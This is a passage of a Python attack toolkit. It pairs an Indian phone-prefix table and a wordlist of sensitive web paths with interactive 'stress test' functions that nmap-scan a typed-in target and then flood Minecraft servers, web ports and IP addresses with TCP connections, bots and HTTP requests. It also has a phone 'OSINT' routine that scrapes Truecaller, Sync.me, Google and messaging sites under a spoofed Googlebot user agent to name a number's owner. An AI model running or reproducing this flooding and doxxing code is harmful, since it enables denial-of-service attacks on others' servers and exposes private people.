    "9864": ("Agartala", "Tripura", "NE"),
    "9865": ("Kohima", "Nagaland", "NE"),
    "9866": ("Itanagar", "Arunachal Pradesh", "NE"),
    "9876": ("Mumbai", "Maharashtra", "Mumbai"),
    "9877": ("Mumbai", "Maharashtra", "Mumbai"),
    "9878": ("Mumbai", "Maharashtra", "Mumbai"),
    "9881": ("Pune", "Maharashtra", "Pune"),
    "9882": ("Nagpur", "Maharashtra", "Vidarbha"),
    "9883": ("Nashik", "Maharashtra", "North Maharashtra"),
    "9890": ("Delhi", "Delhi", "Delhi NCR"),
    "9891": ("Delhi", "Delhi", "Delhi NCR"),
    "9892": ("Bhopal", "Madhya Pradesh", "MP"),
    "9893": ("Indore", "Madhya Pradesh", "MP"),
    "9894": ("Hyderabad", "Telangana", "Hyderabad"),
    "9895": ("Chennai", "Tamil Nadu", "Chennai"),
    "9900": ("Bangalore", "Karnataka", "Bangalore"),
    "9901": ("Bangalore", "Karnataka", "Bangalore"),
    "9902": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9903": ("Kolkata", "West Bengal", "Kolkata"),
    "9904": ("Chennai", "Tamil Nadu", "Chennai"),
    "9912": ("Delhi", "Delhi", "Delhi NCR"),
    "9913": ("Delhi", "Delhi", "Delhi NCR"),
    "9914": ("Delhi", "Delhi", "Delhi NCR"),
    "9915": ("Delhi", "Delhi", "Delhi NCR"),
    "9916": ("Delhi", "Delhi", "Delhi NCR"),
    "9917": ("Delhi", "Delhi", "Delhi NCR"),
    "9918": ("Delhi", "Delhi", "Delhi NCR"),
    "9919": ("Delhi", "Delhi", "Delhi NCR"),
    "9921": ("Mumbai", "Maharashtra", "Mumbai"),
    "9924": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9929": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9930": ("Mumbai", "Maharashtra", "Mumbai"),
    "9933": ("Kolkata", "West Bengal", "Kolkata"),
    "9936": ("Kolkata", "West Bengal", "Kolkata"),
    "9937": ("Kolkata", "West Bengal", "Kolkata"),
    "9938": ("Kolkata", "West Bengal", "Kolkata"),
    "9939": ("Kolkata", "West Bengal", "Kolkata"),
    "9941": ("Chennai", "Tamil Nadu", "Chennai"),
    "9942": ("Chennai", "Tamil Nadu", "Chennai"),
    "9943": ("Chennai", "Tamil Nadu", "Chennai"),
    "9944": ("Bangalore", "Karnataka", "Bangalore"),
    "9946": ("Bangalore", "Karnataka", "Bangalore"),
    "9947": ("Bangalore", "Karnataka", "Bangalore"),
    "9951": ("Delhi", "Delhi", "Delhi NCR"),
    "9952": ("Delhi", "Delhi", "Delhi NCR"),
    "9953": ("Delhi", "Delhi", "Delhi NCR"),
    "9954": ("Delhi", "Delhi", "Delhi NCR"),
    "9955": ("Delhi", "Delhi", "Delhi NCR"),
    "9956": ("Delhi", "Delhi", "Delhi NCR"),
    "9957": ("Delhi", "Delhi", "Delhi NCR"),
    "9959": ("Delhi", "Delhi", "Delhi NCR"),
    "9960": ("Mumbai", "Maharashtra", "Mumbai"),
    "9961": ("Mumbai", "Maharashtra", "Mumbai"),
    "9963": ("Chennai", "Tamil Nadu", "Chennai"),
    "9964": ("Chennai", "Tamil Nadu", "Chennai"),
    "9965": ("Chennai", "Tamil Nadu", "Chennai"),
    "9966": ("Bangalore", "Karnataka", "Bangalore"),
    "9967": ("Bangalore", "Karnataka", "Bangalore"),
    "9969": ("Mumbai", "Maharashtra", "Mumbai"),
    "9970": ("Pune", "Maharashtra", "Pune"),
    "9972": ("Chandigarh", "Chandigarh", "Chandigarh"),
    "9974": ("Delhi", "Delhi", "Delhi NCR"),
    "9975": ("Delhi", "Delhi", "Delhi NCR"),
    "9976": ("Delhi", "Delhi", "Delhi NCR"),
    "9977": ("Delhi", "Delhi", "Delhi NCR"),
    "9978": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9979": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9980": ("Bangalore", "Karnataka", "Bangalore"),
    "9981": ("Bangalore", "Karnataka", "Bangalore"),
    "9982": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9983": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9984": ("Lucknow", "Uttar Pradesh", "UP"),
    "9985": ("Lucknow", "Uttar Pradesh", "UP"),
    "9986": ("Kolkata", "West Bengal", "Kolkata"),
    "9987": ("Mumbai", "Maharashtra", "Mumbai"),
    "9988": ("Chandigarh", "Chandigarh", "Chandigarh"),
    "9989": ("Hyderabad", "Telangana", "Hyderabad"),
    "9990": ("Delhi", "Delhi", "Delhi NCR"),
    "9991": ("Delhi", "Delhi", "Delhi NCR"),
    "9992": ("Delhi", "Delhi", "Delhi NCR"),
    "9993": ("Bhopal", "Madhya Pradesh", "MP"),
    "9994": ("Chennai", "Tamil Nadu", "Chennai"),
    "9995": ("Chennai", "Tamil Nadu", "Chennai"),
    "9996": ("Bangalore", "Karnataka", "Bangalore"),
    "9997": ("Bangalore", "Karnataka", "Bangalore"),
    "9999": ("Mumbai", "Maharashtra", "Mumbai"),
    "8008": ("Mumbai", "Maharashtra", "Jio Mumbai"),
    "8009": ("Mumbai", "Maharashtra", "Jio Mumbai"),
    "8010": ("Kolkata", "West Bengal", "Jio Kolkata"),
    "8018": ("Kolkata", "West Bengal", "Jio Kolkata"),
    "8061": ("Ahmedabad", "Gujarat", "Jio Gujarat"),
    "8062": ("Surat", "Gujarat", "Jio Gujarat"),
    "8070": ("Delhi", "Delhi", "Jio Delhi"),
    "8071": ("Delhi", "Delhi", "Jio Delhi"),
    "8080": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8081": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8082": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8083": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8084": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8085": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8086": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8087": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8088": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8089": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8090": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8091": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8092": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8093": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8094": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8095": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8096": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8097": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8098": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8099": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8105": ("Mumbai", "Maharashtra", "Jio Mumbai"),
    "8106": ("Mumbai", "Maharashtra", "Jio Mumbai"),
    "8111": ("Delhi", "Delhi", "Jio Delhi"),
    "8130": ("Mumbai", "Maharashtra", "Jio Mumbai"),
    "8141": ("Ludhiana", "Punjab", "Jio Punjab"),
    "8168": ("Chennai", "Tamil Nadu", "Jio Tamil Nadu"),
    "8169": ("Chennai", "Tamil Nadu", "Jio Tamil Nadu"),
    "8210": ("Delhi", "Delhi", "Jio Delhi"),
    "8211": ("Delhi", "Delhi", "Jio Delhi"),
    "8218": ("Lucknow", "Uttar Pradesh", "Jio UP"),
    "8219": ("Kanpur", "Uttar Pradesh", "Jio UP"),
    "8230": ("Kolkata", "West Bengal", "Jio Kolkata"),
    "8238": ("Kolkata", "West Bengal", "Jio Kolkata"),
    "8239": ("Kolkata", "West Bengal", "Jio Kolkata"),
    "8240": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8241": ("Bangalore", "Karnataka", "Jio Karnataka"),
    "8248": ("Mumbai", "Maharashtra", "Jio Mumbai"),
    "8249": ("Mumbai", "Maharashtra", "Jio Mumbai"),
    "8250": ("Kolkata", "West Bengal", "Jio Kolkata"),
    "8258": ("Patna", "Bihar", "Jio Bihar"),
    "8259": ("Patna", "Bihar", "Jio Bihar"),
    "8260": ("Bhopal", "Madhya Pradesh", "Jio MP"),
    "8268": ("Bhopal", "Madhya Pradesh", "Jio MP"),
    "8269": ("Bhopal", "Madhya Pradesh", "Jio MP"),
    "8270": ("Jaipur", "Rajasthan", "Jio Rajasthan"),
    "8279": ("Jaipur", "Rajasthan", "Jio Rajasthan"),
    "8280": ("Chandigarh", "Chandigarh", "Jio Chandigarh"),
    "8288": ("Chandigarh", "Chandigarh", "Jio Chandigarh"),
    "8289": ("Chandigarh", "Chandigarh", "Jio Chandigarh"),
    "8290": ("Ranchi", "Jharkhand", "Jio Jharkhand"),
    "8291": ("Ranchi", "Jharkhand", "Jio Jharkhand"),
    "8298": ("Guwahati", "Assam", "Jio Assam"),
    "8299": ("Guwahati", "Assam", "Jio Assam"),
}

WEB_PATH_WORDLIST = [
    "admin", "login", "wp-admin", "wp-login", "administrator", "dashboard",
    "api", "v1", "v2", "graphql", "api/v1", "api/v2",
    ".env", ".git/config", ".git/HEAD", ".htaccess", "robots.txt", "sitemap.xml",
    "backup", "db", "database", "dump", "sql", "mysql", "phpmyadmin",
    "config", "configuration", "settings", "setup", "install",
    "wp-content", "wp-includes", "wp-json", "uploads", "download", "files",
    "assets", "static", "public", "images", "img", "css", "js", "scripts",
    "server-status", "server-info", "cgi-bin", "cgi-bin/test.cgi",
    "test", "testing", "dev", "development", "staging", "stage",
    "debug", "log", "logs", "error", "errors", "trace",
    "phpinfo.php", "info.php", "test.php",
    ".DS_Store", "Thumbs.db", "crossdomain.xml", "web.config",
    "composer.json", "package.json", "Dockerfile", "docker-compose.yml",
    "README.md", "CHANGELOG.md", "LICENSE", "LICENSE.txt",
    "swagger.json", "swagger-ui", "openapi.json", "docs", "documentation",
    "proxy", "vpn", "remote", "panel", "cpanel",
    "status", "health", "healthcheck", "healthz", "metrics", "monitor",
    "prometheus", "grafana", "kibana", "jenkins", "jira", "sonar", "nexus",
    ".aws", ".azure", "cloud", "credentials", "token", "tokens", "keys",
    "register", "signup", "account", "accounts",
    "user", "users", "profile", "profiles", "me",
    "index.php", "index.html", "default.php",
    "xmlrpc.php", "actuator", "actuator/health",
    ".well-known/security.txt", "vendor", "node_modules",
    "webalizer", "stats", "statistics", "awstats",
]
WEB_PATH_WORDLIST = list(dict.fromkeys(WEB_PATH_WORDLIST))


# ── Stress Testing ─────────────────────────────────

def legacy_resolve(domain):
    try:
        socket.inet_aton(domain)
        return domain
    except OSError:
        try:
            ip = socket.gethostbyname(domain)
            print(f"  {c(SYM_CHECK + ' Resolved:', Fore.GREEN)} {domain} {SYM_ARROW} {ip}")
            return ip
        except socket.gaierror:
            print(f"  {c(SYM_X + ' Could not resolve.', Fore.RED)}")
            return None


def legacy_nmap(target):
    header_box(f"Port Scan: {target}", Fore.MAGENTA)
    open_ports = []
    try:
        r = subprocess.run(["nmap", "-T4", "-F", target], capture_output=True, text=True, timeout=120)
        for line in r.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m: open_ports.append(int(m.group(1)))
    except Exception:
        pass
    try:
        mc_str = ",".join(str(p) for p in MINECRAFT_PORTS)
        r = subprocess.run(["nmap", "-T4", "-p", mc_str, target], capture_output=True, text=True, timeout=60)
        for line in r.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                p = int(m.group(1))
                if p not in open_ports: open_ports.append(p)
    except Exception:
        pass
    open_ports.sort()
    if open_ports:
        print(f"\n  {c(SYM_CHECK + ' Open Ports Found:', Fore.GREEN)}")
        for p in open_ports:
            try: svc = socket.getservbyport(p)
            except: svc = "unknown"
            tag = f" {Fore.YELLOW}[MINECRAFT]{Style.RESET_ALL}" if p in MINECRAFT_PORTS else ""
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {Fore.GREEN}{p}{Style.RESET_ALL} ({Fore.CYAN}{svc}{Style.RESET_ALL}){tag}")
    else:
        print(f"\n  {c('No open ports detected.', Fore.YELLOW)}")
    print(f"\n{Fore.MAGENTA}{SYM_LINE_H*40}{Style.RESET_ALL}")
    return open_ports


def mc_worker(ip, port, results, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0); s.connect((ip, port))
        s.sendall(MINECRAFT_PAYLOADS[idx % len(MINECRAFT_PAYLOADS)])
        s.close(); results[idx] = 1
    except Exception: results[idx] = 0


def stress_minecraft():
    header_box("Minecraft Stress Test", Fore.RED)
    target = input(f"  {c(f'Server IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    ip = legacy_resolve(target)
    if not ip: return
    ports = legacy_nmap(ip) or []
    if ports:
        p_in = input(f"  {c(f'Port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
        port = int(p_in) if p_in.isdigit() else 25565
    else:
        p_in = input(f"  {c(f'Port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
        port = int(p_in) if p_in.isdigit() else 25565

    print(f"\n  {c('Attack type:', Fore.CYAN)}")
    print(f"  {c('[1]', Fore.GREEN)}  Bot attack (Node.js mineflayer bots)")
    print(f"  {c('[2]', Fore.GREEN)}  Packet flooding (raw TCP)")
    print(f"  {c('[3]', Fore.GREEN)}  Both")
    at = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()

    if at in ("1", "3"):
        _ensure_mineflayer()
        bot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mc_bots.js")
        if os.path.exists(bot_script):
            b_in = input(f"  {c(f'Bot count (default 20) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            bc = int(b_in) if b_in.isdigit() else 20
            bd = input(f"  {c(f'Duration (seconds, default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            bd = int(bd) if bd.isdigit() else 30
            print(f"\n  {c('Launching mineflayer bots...', Fore.CYAN)}")
            subprocess.Popen(["node", bot_script, ip, str(port), str(bc), str(bd)])
        else:
            print(f"  {YELLOW}mc_bots.js not found. Using raw TCP bots instead.{RESET}")
            bc = 10 if at == "1" else 5
            start_bot = time.time(); bsent = 0; bdone = 0
            for b in range(0, bc, 200):
                be = min(b + bc, bc); batch = list(range(b, be)); br = {}
                with ThreadPoolExecutor(max_workers=200) as ex:
                    fs = {ex.submit(_mc_bot_worker, ip, port, br, i): i for i in batch}
                    for f in as_completed(fs): f.result()
                for v in br.values(): bsent += v; bdone += 1
            bel = time.time() - start_bot
            print(f"  {GREEN}{SYM_CHECK} Raw bot connections: {bsent}/{bc} in {bel:.1f}s{RESET}")

    if at in ("2", "3"):
        n_in = input(f"  {c(f'Packets to send (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
        num = int(n_in) if n_in.isdigit() else 500
        start = time.time(); sent = 0; done = 0; bs = 1600
        try:
            for b in range(0, num, bs):
                be = min(b + bs, num); batch = list(range(b, be)); br = {}
                with ThreadPoolExecutor(max_workers=200) as ex:
                    fs = {ex.submit(mc_worker, ip, port, br, i): i for i in batch}
                    for f in as_completed(fs): f.result()
                for v in br.values(): sent += v; done += 1
                p = f"{progress_bar(min(done, num), num)}  S:{sent}  E:{done-sent}"
                sys.stdout.write(f"\r{p:60s}")
                sys.stdout.flush()
            print()
        except KeyboardInterrupt: print(f"\n  {YELLOW}Interrupted.{RESET}")
        el = time.time() - start
        rat = sent / el if el > 0 else 0
        print(f"  {c('Packet flood complete!', Fore.GREEN)} {c(str(sent), Fore.CYAN)} pkts in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:.1f} pkt/s', Fore.MAGENTA)})")

    print()


def http_worker(session, url, results, idx, verify_ssl):
    try:
        r = session.get(url, timeout=8, verify=verify_ssl)
        results[idx] = 1 if r.status_code < 500 else 0
    except Exception:
        results[idx] = 0


def stress_web():
    header_box("Web Stress Test", Fore.RED)
    target = input(f"  {c(f'Target IP/domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    ip = legacy_resolve(target)
    if not ip: return

    hostname = target
    try:
        socket.inet_aton(target)
        hostname = target
    except OSError:
        hostname = target

    print(f"  {c('Note:', Fore.YELLOW)} Using hostname '{hostname}' for requests (Host header must match your domain)")
    print(f"  {c('Note:', Fore.YELLOW)} Platforms like Vercel/Cloudflare block nmap scans — enter ports manually if none detected")

    ports = legacy_nmap(ip) or []
    web_ports = sorted(set(p for p in ports if p in (80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9090)))

    if web_ports:
        print(f"  {c('Open web ports:', Fore.GREEN)} {c(str(web_ports), Fore.CYAN)}")
        p_in = input(f"  {c(f'Ports to stress (comma sep, default same) {SYM_PROMPT} ', Fore.CYAN)}").strip()
        if p_in:
            try: web_ports = [int(x.strip()) for x in p_in.split(",") if x.strip()]
            except: pass
    else:
        print(f"  {c('No web ports detected via scan.', Fore.YELLOW)}")
        p_in = input(f"  {c(f'Enter ports manually (e.g. 80,443) {SYM_PROMPT} ', Fore.CYAN)}").strip()
        if p_in:
            try: web_ports = [int(x.strip()) for x in p_in.split(",") if x.strip()]
            except: pass
        else:
            web_ports = [443]

    use_ssl = any(p in (443, 8443) for p in web_ports)
    verify_ssl = False
    if use_ssl:
        ans = input(f"  {c(f'Verify SSL certificates? (y/N, default no) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
        verify_ssl = ans == "y"
        if not verify_ssl:
            warnings.filterwarnings("ignore", message="Unverified HTTPS request")
            print(f"  {YELLOW}{SYM_WARN} SSL verification disabled{RESET}")

    n_in = input(f"  {c(f'Requests per port (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    num = int(n_in) if n_in.isdigit() else 500
    total = num * len(web_ports)
    start = time.time(); sent = 0; done = 0; bs = 400

    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
    with requests.Session() as sess:
        sess.mount('http://', adapter)
        sess.mount('https://', adapter)

        try:
            for port in web_ports:
                scheme = "https" if port in (443, 8443) else "http"
                url = f"{scheme}://{hostname}:{port}/"
                port_start = time.time()
                port_ok = 0
                for b in range(0, num, bs):
                    be = min(b + bs, num); batch = list(range(b, be)); br = {}
                    with ThreadPoolExecutor(max_workers=100) as ex:
                        fs = {ex.submit(http_worker, sess, url, br, i, verify_ssl): i for i in batch}
                        for f in as_completed(fs): f.result()
                    for v in br.values():
                        sent += v
                        port_ok += v
                        done += 1
                    p = f"{progress_bar(done, total)}  OK:{sent}  Er:{done-sent}"
                    sys.stdout.write(f"\r{p:65s}")
                    sys.stdout.flush()
                port_el = time.time() - port_start
                pct = port_ok / num * 100 if num > 0 else 0
                print(f"\n    Port {port}: {port_ok}/{num} OK ({pct:.0f}%) in {port_el:.1f}s")
            print()
        except KeyboardInterrupt: print(f"\n  {YELLOW}Interrupted.{RESET}")
    el = time.time() - start
    rat = sent / el if el > 0 else 0
    print(f"\n  {c('Complete!', Fore.GREEN)} {c(str(sent), Fore.CYAN)} reqs in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:.1f} req/s', Fore.MAGENTA)})\n")


def ip_worker(ip, port, results, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0); s.connect((ip, port)); s.sendall(b"GET / HTTP/1.0\r\n\r\n"); s.close(); results[idx] = 1
    except: results[idx] = 0


def ip_flood_worker(ip, ports, results, idx):
    return ip_worker(ip, ports[idx % len(ports)], results, idx)


def stress_ip():
    header_box("IP Flood Test", Fore.RED)
    ip = input(f"  {c(f'Target IP {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not ip: return
    try: socket.inet_aton(ip)
    except: print(f"  {RED}Invalid IP.{RESET}"); return
    print(f"  {c('Ports:', Fore.CYAN)} [a]uto ({len(STRESS_PORTS)}) [m]anual")
    if input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() == "m":
        p_in = input(f"  {c(f'Ports (comma) {SYM_PROMPT} ', Fore.CYAN)}").strip()
        try: ports = [int(x.strip()) for x in p_in.split(",") if x.strip()]
        except: ports = STRESS_PORTS[:]
    else: ports = STRESS_PORTS[:]
    n_in = input(f"  {c(f'Conn/port (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    nc = int(n_in) if n_in.isdigit() else 500
    tw = nc * len(ports); sent = 0; done = 0; bs = 1600; start = time.time()
    try:
        for b in range(0, tw, bs):
            be = min(b + bs, tw); batch = list(range(b, be)); br = {}
            with ThreadPoolExecutor(max_workers=200) as ex:
                fs = {ex.submit(ip_flood_worker, ip, ports, br, i): i for i in batch}
                for f in as_completed(fs): f.result()
            for v in br.values(): sent += v; done += 1
            p = f"{progress_bar(min(done, tw), tw)}  OK:{sent}  Er:{done-sent}"
            sys.stdout.write(f"\r{p:60s}")
            sys.stdout.flush()
        print()
    except KeyboardInterrupt: print(f"\n  {YELLOW}Interrupted.{RESET}")
    el = time.time() - start
    rat = sent / el if el > 0 else 0
    print(f"\n  {c(SYM_CHECK + ' Complete!', Fore.GREEN)} {c(str(sent), Fore.CYAN)} conns x {c(str(len(ports)), Fore.MAGENTA)} ports in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:.1f} conn/s', Fore.MAGENTA)})\n")


# ── OSINT Tools ────────────────────────────────────

def _detect_indian_operator(ndc):
    """Detect Indian telecom operator from NDC prefix."""
    first_two = ndc[:2]
    first_digit = ndc[0]
    jio_2d = {"80","81","82","83","84","85","86","87","88","89",
              "70","71","72","73","74","75","76","77","78","79",
              "60","61","62","63","64","65","66","67","68","69"}
    airtel_2d = {"98","99","96","97","90","91","92","93","94","95"}
    vodafone_2d = {"99","98","97","96","95","94","93","92","91","90"}
    bsnl_2d = {"94","95","96","97","98","99","70","71","72","73","74","75","76","77","78","79"}
    if first_two in jio_2d:
        return "Reliance Jio"
    if first_two in airtel_2d:
        return "Airtel"
    if first_digit in ("9","8","7"):
        return "Airtel/Jio (MNP possible)"
    if first_digit == "6":
        return "BSNL/Jio (MNP possible)"
    return "Unknown Operator"


def osint_phone():
    header_box("Phone Number Deep OSINT", Fore.YELLOW)
    num = input(f"  {c(f'Phone (+CC) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not num: return
    cleaned = re.sub(r'[^\d+]', '', num)
    if not cleaned.startswith('+'): cleaned = '+' + cleaned
    print(f"\n  {c('Analyzing:', Fore.GREEN)} {cleaned}")
    print(f"  {c('Running live lookups...', Fore.YELLOW)}")

    detected = "Unknown"
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: -len(x[0])):
        if cleaned.startswith('+' + code): detected = country; break
    digits = cleaned.lstrip('+'); length = len(digits)
    lines = []
    lines.append(f"  Number: {c(cleaned, Fore.GREEN)}")
    lines.append(f"  E.164:  {c(digits, Fore.CYAN)}")
    lines.append(f"  Country: {c(detected, Fore.YELLOW)}")
    valid = (detected == 'India' and length == 12) or (detected == 'US/CA' and length == 11) or length >= 8
    lines.append(f"  Valid:  {c(SYM_CHECK, Fore.GREEN) if valid else c(SYM_X, Fore.RED)}")

    spam_count = 0
    truecaller_name = ""
    truecaller_carrier = ""

    # ── Try Truecaller web search ──
    for tc_url, tc_ua in [
        (f"https://www.truecaller.com/search/in/{digits}", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"),
        (f"https://www.truecaller.com/s/{digits}", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"),
        (f"https://www.truecaller.com/search/in/{digits}", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
    ]:
        try:
            tc_resp = requests.get(
                tc_url, timeout=8, headers={"User-Agent": tc_ua},
                allow_redirects=True
            )
            if tc_resp.status_code != 200:
                continue
            text = tc_resp.text
            # Detect login wall: title or text says "Sign in"
            if re.search(r'<title>(Sign\s*[Ii]n|Log\s*[Ii]n|Truecaller\s*for\s*Web)</title>', text):
                continue

            # Next.js embeds all data in __NEXT_DATA__
            nd_match = re.search(r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>', text, re.DOTALL)
            if nd_match:
                import json as _json
                try:
                    nd = _json.loads(nd_match.group(1))
                    page_data = nd.get("props", {}).get("pageProps", {})
                    search_data = page_data.get("searchResult", {}) or page_data.get("phoneInfo", {})
                    if search_data:
                        for name_key in ["name", "ownerName", "displayName", "fullName"]:
                            if search_data.get(name_key):
                                truecaller_name = search_data[name_key][:60]
                                break
                        for car_key in ["carrier", "operator", "networkName"]:
                            if search_data.get(car_key):
                                truecaller_carrier = search_data[car_key][:40]
                                break
                        spam_score_raw = search_data.get("spamScore") or search_data.get("spamCount") or 0
                        if isinstance(spam_score_raw, (int, float)) and spam_score_raw > 0:
                            spam_count = int(spam_score_raw)
                except Exception:
                    pass

            # Fallback: page title often has name
            if not truecaller_name:
                title_m = re.search(r'<title>(.*?)</title>', text, re.DOTALL)
                if title_m:
                    title = title_m.group(1).strip()
                    parts = title.split(" - ")
                    if len(parts) >= 2 and digits in title:
                        truecaller_name = parts[0].strip()[:60]

            # Fallback: meta description
            if not truecaller_name:
                desc_m = re.search(r'<meta[^>]*name="description"[^>]*content="([^"]+)"', text, re.IGNORECASE)
                if desc_m and digits in desc_m.group(1):
                    truecaller_name = desc_m.group(1).split(" - ")[0].strip()[:60]

            # Fallback: carrier in any JS variable
            if not truecaller_carrier:
                c_m = re.search(r'["\']carrier["\']\s*:\s*["\']([^"\']+)', text)
                if c_m:
                    truecaller_carrier = c_m.group(1)

            # Fallback: spam score in JS
            if not spam_count:
                s_m = re.search(r'["\']spamScore["\']\s*:\s*(\d+)', text)
                if s_m:
                    spam_count = int(s_m.group(1))

            if truecaller_name or truecaller_carrier:
                break
        except Exception:
            pass

    # ── Try Sync.me as secondary lookup ──
    if not truecaller_name and not truecaller_carrier:
        try:
            sync_resp = requests.get(
                f"https://www.sync.me/{digits}",
                timeout=6, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"}, allow_redirects=True
            )
            if sync_resp.status_code == 200:
                sync_text = sync_resp.text
                # Sync.me sometimes shows name in title
                s_title = re.search(r'<title>(.*?)</title>', sync_text, re.DOTALL)
                if s_title:
                    s_t = s_title.group(1).strip()
                    if digits in s_t and "not found" not in s_t.lower():
                        parts = s_t.split(" - ")
                        truecaller_name = parts[0].strip()[:60]
        except Exception:
            pass

    # ── Try Google search for cached info ──
    google_snippet = ""
    for g_ua in [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    ]:
        try:
            g_resp = requests.get(
                "https://www.google.com/search?q=" + requests.utils.quote(cleaned),
                timeout=6, headers={"User-Agent": g_ua}
            )
            if g_resp.status_code != 200:
                continue
            gt = g_resp.text

            # Try multiple snippet patterns
            found = False
            for pattern in [
                r'<div[^>]*class="[^"]*BNeawe[^"]*"[^>]*>(.*?)</div>',
                r'<span[^>]*class="[^"]*aCOpRe[^"]*"[^>]*>(.*?)</span>',
                r'<div[^>]*class="[^"]*IsZvec[^"]*"[^>]*>(.*?)</div>',
            ]:
                snippets = re.findall(pattern, gt, re.DOTALL)
                for s in snippets:
                    clean_s = re.sub(r'<[^>]+>', '', s).strip()
                    if len(clean_s) > 20 and digits in clean_s:
                        google_snippet = clean_s[:200]
                        found = True
                        break
                if found:
                    break

            if not found:
                # Brute-force: find any div with text containing the number
                all_divs = re.findall(r'<div[^>]*>(.*?)</div>', gt, re.DOTALL)
                for d in all_divs:
                    clean_d = re.sub(r'<[^>]+>', '', d).strip()
                    if len(clean_d) > 30 and digits in clean_d and len(clean_d) < 300:
                        google_snippet = clean_d[:200]
                        found = True
                        break

            if google_snippet:
                break
        except Exception:
            pass

    # ── Check WhatsApp availability ──
    wa_available = False
    try:
        wa_resp = requests.get(
            f"https://wa.me/{digits}",
            timeout=6, allow_redirects=False
        )
        if wa_resp.status_code in (200, 302):
            wa_available = True
    except Exception:
        pass

    # ── Check Telegram ──
    tg_available = False
    try:
        tg_resp = requests.get(
            f"https://t.me/{digits}",
            timeout=6, allow_redirects=True
        )
        if tg_resp.status_code == 200 and "tgme_page" in tg_resp.text:
            tg_available = True
    except Exception:
        pass

    # ── Try Numlookup for carrier/location ──
    numlookup_data = {}
    try:
        nl_resp = requests.get(
            f"https://www.numlookup.com/{digits}",
            timeout=6, headers={"User-Agent": "Mozilla/5.0"}
        )
        if nl_resp.status_code == 200:
            for key, pattern in [("Carrier", r"Carrier[:\s]+([^<]+)"), ("Location", r"Location[:\s]+([^<]+)"),
                                 ("Line Type", r"(?:Line Type|Type)[:\s]+([^<]+)")]:
                m = re.search(pattern, nl_resp.text, re.IGNORECASE | re.DOTALL)
                if m:
                    numlookup_data[key.lower().replace(" ", "_")] = m.group(1).strip()
    except Exception:
        pass

    # ── Build output lines ──
    if truecaller_name:
        lines.append(f"  Owner:  {c(truecaller_name, Fore.GREEN)} (Truecaller)")
    if google_snippet and (not truecaller_name or truecaller_name.lower() not in google_snippet.lower()):
        lines.append(f"  Web:    {c(google_snippet[:120], Fore.YELLOW)}")

    if not truecaller_name and not google_snippet:
        lines.append(f"  Owner:  {c('Not publicly listed', Fore.RED)}")

    if truecaller_carrier:
        lines.append(f"  Carrier: {c(truecaller_carrier, Fore.CYAN)} (Truecaller)")
    elif numlookup_data.get("carrier"):
        lines.append(f"  Carrier: {c(numlookup_data['carrier'], Fore.CYAN)} (Numlookup)")
    wa_status = "\u2713 WhatsApp" if wa_available else ""
    tg_status = "\u2713 Telegram" if tg_available else ""
    apps = [s for s in [wa_status, tg_status] if s]
    if apps:
        lines.append(f"  Apps:   {c(' | '.join(apps), Fore.GREEN)}")
    else:
